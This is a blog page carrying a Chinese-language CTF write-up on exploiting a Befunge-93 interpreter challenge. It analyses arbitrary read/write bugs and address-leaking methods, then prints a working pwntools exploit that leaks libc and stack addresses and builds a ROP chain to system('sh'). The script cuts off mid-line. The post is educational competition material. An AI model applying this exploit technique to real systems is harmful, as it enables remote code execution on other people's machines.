              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-07T18:04:00+08:00">
                2016-09-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn<br>Point: 200<br>Solver: bruce30262 @ BambooFox</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>首先透過 <code>file</code> 指令以及 <a target="_blank" rel="noopener" href="http://www.trapkit.de/tools/checksec.html">checksec.sh</a> 的幫助，我們可以知道這是一個 x86_64 的 ELF，保護全開:  </p>
<pre>
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   ./befunge_patch  
</pre>

<p>之後透過將程式丟入 IDA Pro 做靜態分析，以及試著執行程式，對程式行為進行簡單的動態分析之後，我們可以得知:  </p>
<ul>
<li>這是一隻 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Befunge">Befunge-93</a> 程式的 Interpreter。程式一開始會要求我們輸入一個 Befunge-93 程式，之後會試著解譯並執行我們的程式。  </li>
<li>一隻 Befunge-93 程式由一連串的 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Befunge#Befunge-93_instruction_list">Befunge-93 指令</a> 所組成。我們可以輸入很多行的 Befunge-93 指令(一行最多80個字元，最多25行)。  </li>
<li>程式之後會一個字元一個字元的解譯並執行我們的Befunge-93 指令，最多執行到第 10000 個指令</li>
</ul>
<p>整理成 pseudo code 之後大概是這種感覺:  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不重要的部分將以註解代替</span></span><br><span class="line"><span class="comment">// 實際程式有做哪些事情可以自行利用 IDA Pro 進行分析</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Welcome to Online Befunge(93) Interpreter&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Please input your program.&quot;</span>);</span><br><span class="line">	program = read_program(); <span class="comment">// read user input to buffer &#x27;program&#x27;</span></span><br><span class="line">	</span><br><span class="line">	step = <span class="number">10001</span>;</span><br><span class="line">	row = <span class="number">0</span>, col = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		ins = program[<span class="number">80</span> * row + col]</span><br><span class="line">		<span class="keyword">switch</span> ( ins )</span><br><span class="line">		&#123;</span><br><span class="line">			.....<span class="comment">//other instruction...</span></span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;&amp;&#x27;</span>: <span class="comment">// ask user for a number and push it to stack</span></span><br><span class="line">				__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">				push(x);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>: <span class="comment">// Pop value and output as an integer followed by a space</span></span><br><span class="line">				x = pop();</span><br><span class="line">				__printf_chk(<span class="number">1LL</span>, <span class="string">&quot;%d &quot;</span>, x);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			.....<span class="comment">//other instruction...</span></span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:  <span class="comment">// pop x, y, push x*y</span></span><br><span class="line">				a = pop();</span><br><span class="line">				b = pop();</span><br><span class="line">				push(a * b);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			.....<span class="comment">//other instruction...</span></span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;g&#x27;</span>: <span class="comment">// (get) Pop x and y, then push ASCII value of the character at that position in the program</span></span><br><span class="line">				x = pop();</span><br><span class="line">				y = pop();</span><br><span class="line">				push( (<span class="type">char</span>)(program[<span class="number">80</span> * x + y]) );</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>: <span class="comment">// (put) Pop x, y, and z, then change the character at (x,y) in the program to the character with ASCII value z</span></span><br><span class="line">				x = pop();</span><br><span class="line">				y = pop();</span><br><span class="line">				z = pop();</span><br><span class="line">				program[<span class="number">80</span> * x + y] = (<span class="type">char</span>)z;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27; &#x27;</span>: <span class="comment">// space = do nothing</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		--step;</span><br><span class="line">		<span class="comment">// update row &amp; column</span></span><br><span class="line">		<span class="comment">// do other stuff...</span></span><br><span class="line">	&#125;<span class="keyword">while</span> ( step );</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Too many steps. Is there any infinite loops?&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>pseudo code 將一些比較重要的功能都列在上面了。  </p>
<p>透過觀察程式的行為，我們不難發現:  </p>
<ul>
<li>利用 <code>&amp;</code>, <code>g</code> 和 <code>.</code> 的功能，我們有辦法做到<strong>任意讀</strong>。<ul>
<li>先透過 <code>&amp;</code> 將 <code>x</code> 跟 <code>y</code> push 到 Stack 上<ul>
<li><code>x</code> 與 <code>y</code> 我們可控(32 bit integer)</li>
<li>這邊注意 Stack (大寫S) 是程式在 bss 段自行模擬出來的一塊，擁有類似 stack 行為的記憶體區塊，並不是指程式真正的 stack。</li>
</ul>
</li>
<li><code>g</code> 的功能是將 <code>program[80 * x + y]</code> 的內容 push 至 Stack 上。因為<code>x</code> 與 <code>y</code> 我們可控，代表著我們可以將任意位址的內容 push 到 Stack 上。</li>
<li><code>.</code> 會將 Stack 頂端的值(可控) pop 出來 (1 byte)，並印出他的數值。</li>
</ul>
</li>
<li>利用 <code>&amp;</code> 和 <code>p</code> 的功能，我們還有辦法做到<strong>任意寫</strong><ul>
<li>先透過 <code>&amp;</code> 將 <code>x</code>, <code>y</code>與 <code>z</code> push 到 Stack 上</li>
<li><code>p</code> 功能會先從 Stack pop 出 3 個值 (<code>x</code>, <code>y</code>, <code>z</code>，均可控)，之後將 z 的值放入 <code>program[80 * x + y]</code> (即<code>program[80 * x + y] = z</code>)。</li>
</ul>
</li>
<li>還有一點要注意  <ul>
<li>因為透過 <code>&amp;</code> 功能將數值 push 進 Stack 時，一次只能 push 一個 integer (32 bit)。如果我們想要使 <code>program[80 * x + y]</code> 跳到很遠的地方，<code>x</code> 與 <code>y</code> 很有可能會需要是一個超過 integer 範圍的數值，如此一來使用 <code>&amp;</code>功能將無法滿足我們的需求。</li>
<li>解決方法，是利用 <code>*</code> 功能。<code>*</code> 會從 Stack 頂端 pop 出兩個數值 <code>x</code>與<code>y</code>，並將 <code>x * y</code> 的結果 push 回 Stack 上。這裡全程是使用 64 bit register 進行操作，所以不會有 integer 32 bit 的問題。</li>
<li>因此，先透過<code>*</code>功能將 Stack 頂端變成一個 long integer，之後我們就可以利用上面的方法<strong>對任意位址做任意讀寫。</strong></li>
</ul>
</li>
</ul>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>現在我們知道洞在哪了，也知道該怎麼利用這個漏洞進行任意位址的讀寫操作。因為這題有DEP無法執行 shellcode，因此首要的任務是要去 leak libc 的 address，我們才有辦法知道 <code>system</code> 的位址，進而執行 <code>system(&#39;sh&#39;)</code> 拿 shell。  </p>
<p>而要 leak libc 的 address 其實不難。這題雖然 GOT 不能寫，但還是可以讀，因此我們可以透過任意讀的漏洞來 leak GOT，獲得 libc 的 address。這裡我是去 leak <code>__libc_start_main</code> 的 GOT，並透過 <a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database">libc-database</a> 來獲取遠端 libc 的版本以及相關的 offset。  </p>
<p>現在我們有了 libc 的 address，該跳 system 了。問題是該怎麼跳呢?這題沒有 function pointer， GOT 與 fini array 都是唯讀，我們無法透過 overwrite function pointer 或是 GOT hijacking 的方式來 exploit。<strong>唯一的辦法，就是去 overwrite return address</strong>。  </p>
<p>問題來了: 要 overwrite return address，首先我們必須知道 stack 的位址，因此我們必須要有辦法先 leak stack address。而要 leak stack address，有以下幾種方式:  </p>
<ul>
<li><strong>leak stack 上的 saved rbp 或是 argv</strong>。這部份通常是用在 format string 的漏洞，這題無法這樣做。  </li>
<li><strong>leak tls section 上的 stack address</strong>。這部份比較進階，簡單來說就是程式在執行的時候，會有個 memory 的區塊叫做 tls section，裡面會存許多有用的東西，像是 stack canary, main_arena 的 address, 以及一個不知道指向哪裡的 stack address。而要透過這種方式 leak stack address，我們必須要有辦法知道 tls section 的位址，而這通常需要透過程式先呼叫 mmap，之後 leak mmap 出來的 memory address 來達成。這題因為沒有 malloc 或是 mmap，所以也無法透過這樣的方式來 leak stack address。  </li>
<li><strong>leak ld-linux.so 的 __libc_stack_end symbol</strong>。如果我們有辦法知道 ld-linux.so 的位址以及版本，我們可以透過 leak 裡面的 <code>__libc_stack_end</code> 這個 symbol，來獲取 stack address。這題用這種方式理論上辦的到，我自己就是用這種方式 leak 的，只是做起來非常麻煩。解完這題之後，經詢問別人才發現原來還有第四種方式。  </li>
<li><strong>leak libc 裡面的 environ symbol</strong>。經過 pwn queen meh 的提點，才知道原來 libc 裡面有個 symbol 叫做 <code>environ</code>，裡面會存 stack address。因此這題比較漂亮的方式，是 leak libc 的 address 之後，直接 leak <code>libc.symbols[&#39;environ&#39;]</code> 來獲取 stack address。</li>
</ul>
<p>不過當時的我還是採取了第三種，也就是先 leak ld-linux.so，再 leak <code>__libc_stack_end</code> 的方式來獲取 stack address。ld-linux.so 的版本是直接用 libc 版本去猜。至於 leak ld-linux.so 的位址有幾種方式:  </p>
<ul>
<li>leak <code>dl_resolve</code> 的GOT。<code>dl_resolve</code> 位於 <code>ld-linux.so</code> 裡面，而它的 GOT 通常位於 GOT[2] ( 第三個 GOT entry ) 這個位置，因此如果有辦法 leak <code>dl_resolve</code> 的 GOT， 可以直接獲得 ld-linux.so 的位址。但是這題因為是 FULL RELRO 的關係，因此 GOT[2] 的位址是空的 ( 因為function 已經 bind 好了不需要做 runtime resolve )， 無法利用這樣的方式來 leak。</li>
<li>leak DT_DEBUG 的 info。這部份請參考<a target="_blank" rel="noopener" href="http://rk700.github.io/article/2015/04/09/dt_debug-read">這個連結</a>。簡而言之，這題用這種方式是可行的 ( 有辦法 leak 到 ld-linux.so )。</li>
</ul>
<p>因此總結這題的 exploit 方法:  </p>
<ul>
<li>先透過任意讀的漏洞 leak libc 的 address</li>
<li>(錯誤解法) 透過任意讀的漏洞 leak ld-linux.so 的 address，再 leak <code>__libc_stack_end</code> 來獲得 stack address  </li>
<li>(正確解法) 直接 leak libc 的 <code>environ</code> symbol 來獲取 stack address</li>
<li>透過任意寫的漏洞，overwrite return address<ul>
<li>可透過 pop_rdi –&gt; bin_sh 字串 –&gt; system 的方式做 ROP 來拿 shell</li>
</ul>
</li>
</ul>
<p>final exploit ( leak ld-linux.so的版本 ) :</p>
<figure class="highlight python"><figcaption><span>exp_bef.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;pwn1.chal.ctf.westerns.tokyo&quot;</span> </span><br><span class="line">PORT = <span class="number">62839</span></span><br><span class="line">ELF_PATH = <span class="string">&quot;./befunge_patch&quot;</span></span><br><span class="line">LIBC_PATH = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line">libc = ELF(LIBC_PATH)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myexec</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_addr</span>(<span class="params">s, f</span>): <span class="comment"># search string address in file</span></span><br><span class="line">    result = <span class="built_in">list</span>(f.search(s+<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(result): <span class="comment"># no result</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_one_byte</span>(<span class="params">off_1, off_80</span>):</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(off_1))</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(off_80))</span><br><span class="line">    ret = r.recvuntil(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(ret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>(<span class="params">base, off_80, name=<span class="literal">None</span></span>):</span><br><span class="line">    ret_addr = <span class="number">0</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(base, base+<span class="number">6</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;leaking %s byte : %d&quot;</span> % (name, cnt+<span class="number">1</span>)</span><br><span class="line">        ret = leak_one_byte(i, off_80)</span><br><span class="line">        ret_addr = ret_addr | ((ret&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>*cnt)</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal_offset</span>(<span class="params">addr, text_base</span>):</span><br><span class="line">    start_from = text_base + <span class="number">0x202040</span></span><br><span class="line">    offset = addr - start_from</span><br><span class="line">    off_80 = offset/<span class="number">80</span></span><br><span class="line">    off_1 = offset%<span class="number">80</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> off_1, off_80</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_far_addr</span>(<span class="params">addr, text_base, name</span>):</span><br><span class="line">    ret_addr = <span class="number">0</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    off_1, off_80 = cal_offset(addr, text_base)</span><br><span class="line">    temp = <span class="built_in">int</span>(math.sqrt(off_80))</span><br><span class="line">    off_1 = (off_80 - temp**<span class="number">2</span>)*<span class="number">80</span> + off_1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(off_1, off_1+<span class="number">6</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;leaking %s byte : %d&quot;</span> % (name, cnt+<span class="number">1</span>)</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(temp))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(temp))</span><br><span class="line">        ret = <span class="built_in">int</span>(r.recvuntil(<span class="string">&quot; &quot;</span>))</span><br><span class="line">        ret_addr = ret_addr | ((ret&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>*cnt)</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_far_addr</span>(<span class="params">addr, text_base, name, value</span>):</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    off_1, off_80 = cal_offset(addr, text_base)</span><br><span class="line">    temp = <span class="built_in">int</span>(math.sqrt(off_80))</span><br><span class="line">    off_1 = (off_80 - temp**<span class="number">2</span>)*<span class="number">80</span> + off_1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(off_1, off_1+<span class="number">6</span>):</span><br><span class="line">        v = (value&gt;&gt;(<span class="number">8</span>*cnt)) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;writing %s byte %d : %x&quot;</span> % (name, cnt+<span class="number">1</span>, v)</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(v))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(temp))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(temp))</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#LOCAL = True</span></span><br><span class="line">    LOCAL = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># construct befunge-93 program</span></span><br><span class="line">    preline = myexec(<span class="string">&quot;wc -l ./bbb | awk &#x27;&#123;print $1&#125;&#x27;&quot;</span>)</span><br><span class="line">    preline = <span class="built_in">int</span>(preline)</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./bbb&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    s = f.read()</span><br><span class="line">    s += <span class="string">&quot;\n&quot;</span>*(<span class="number">80</span>-preline)</span><br><span class="line">    </span><br><span class="line">    r, LD = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> LOCAL:</span><br><span class="line">        r = remote(HOST, PORT)</span><br><span class="line">        LD = ELF(<span class="string">&quot;/mnt/files/ld-linux-x86-64.so.2&quot;</span>) <span class="comment"># ubuntu 14.04 64 bit ld-linux</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = process(ELF_PATH)</span><br><span class="line">        LD = ELF(<span class="string">&quot;/lib64/ld-linux-x86-64.so.2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send program</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, s)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;&gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc</span></span><br><span class="line">    libc_main = leak_addr(-<span class="number">48</span>, -<span class="number">2</span>, <span class="string">&quot;libc_main&quot;</span>)</span><br><span class="line">    libc_base, system, bin_sh = <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="comment"># for local</span></span><br><span class="line">    <span class="keyword">if</span> LOCAL:</span><br><span class="line">        libc.address += libc_main - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">        libc_base = libc.address</span><br><span class="line">        system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        bin_sh = str_addr(<span class="string">&quot;sh\x00&quot;</span>, libc)</span><br><span class="line">    <span class="comment"># for remote</span></span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        libc_base = libc_main - <span class="number">0x21e50</span></span><br><span class="line">        system = libc_base + <span class="number">0x0000000000046590</span></span><br><span class="line">        bin_sh = libc_base + <span class="number">0x17c8c3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak text base</span></span><br><span class="line">    text_base = leak_addr(-<span class="number">56</span>, -<span class="number">9</span>, <span class="string">&quot;text_base&quot;</span>)</span><br><span class="line">    text_base -= <span class="number">0xb00</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.info(<span class="string">&quot;text_base: &quot;</span>+<span class="built_in">hex</span>(text_base))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># leak r_debug</span></span><br><span class="line">    r_debug = leak_addr(<span class="number">0</span>, -<span class="number">7</span>, <span class="string">&quot;r_debug&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;r_debug: &quot;</span>+<span class="built_in">hex</span>(r_debug))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># traverse link_map structure &amp; leak ld-linux.so base address</span></span><br><span class="line">    link_map_addr = r_debug + <span class="number">8</span></span><br><span class="line">    link_map_text = leak_far_addr(link_map_addr, text_base, <span class="string">&quot;link_map_text&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;link_map_text: &quot;</span>+<span class="built_in">hex</span>(link_map_text))</span><br><span class="line">    link_map_vdso = leak_far_addr(link_map_text+<span class="number">24</span>, text_base, <span class="string">&quot;link_map_vdso&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;link_map_vdso: &quot;</span>+<span class="built_in">hex</span>(link_map_vdso))</span><br><span class="line">    link_map_libc = leak_far_addr(link_map_vdso+<span class="number">24</span>, text_base, <span class="string">&quot;link_map_libc&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;link_map_libc: &quot;</span>+<span class="built_in">hex</span>(link_map_libc))</span><br><span class="line">    link_map_ld = leak_far_addr(link_map_libc+<span class="number">24</span>, text_base, <span class="string">&quot;link_map_ld&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;link_map_ld: &quot;</span>+<span class="built_in">hex</span>(link_map_ld))</span><br><span class="line">    ld_base = leak_far_addr(link_map_ld, text_base, <span class="string">&quot;ld_base&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;ld_base: &quot;</span>+<span class="built_in">hex</span>(ld_base))</span><br><span class="line">    <span class="comment"># leak __libc_stack_end in ld-linux.so, get stack address</span></span><br><span class="line">    LD.address += ld_base</span><br><span class="line">    log.info(<span class="string">&quot;libc_stack_end: &quot;</span>+<span class="built_in">hex</span>(LD.symbols[<span class="string">&#x27;__libc_stack_end&#x27;</span>]))</span><br><span class="line">    stack_addr = leak_far_addr(LD.symbols[<span class="string">&#x27;__libc_stack_end&#x27;</span>], text_base, <span class="string">&quot;stack addr&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;stack_addr: &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">    </span><br><span class="line">    pop_rdi = text_base + <span class="number">0x000000000000120c</span></span><br><span class="line">    ret_addr = stack_addr - <span class="number">216</span></span><br><span class="line">    log.info(<span class="string">&quot;ret_addr: &quot;</span>+<span class="built_in">hex</span>(ret_addr))</span><br><span class="line">    log.info(<span class="string">&quot;pop_rdi: &quot;</span>+<span class="built_in">hex</span>(pop_rdi))</span><br><span class="line">    log.info(<span class="string">&quot;bin_sh: &quot;</span>+<span class="built_in">hex</span>(bin_sh))</span><br><span class="line">    log.info(<span class="string">&quot;system: &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># overwrite return address</span></span><br><span class="line">    write_far_addr(ret_addr, text_base, <span class="string">&quot;ret_addr&quot;</span>, pop_rdi)</span><br><span class="line">    write_far_addr(ret_addr+<span class="number">8</span>, text_base, <span class="string">&quot;ret_addr+8&quot;</span>, bin_sh)</span><br><span class="line">    write_far_addr(ret_addr+<span class="number">16</span>, text_base, <span 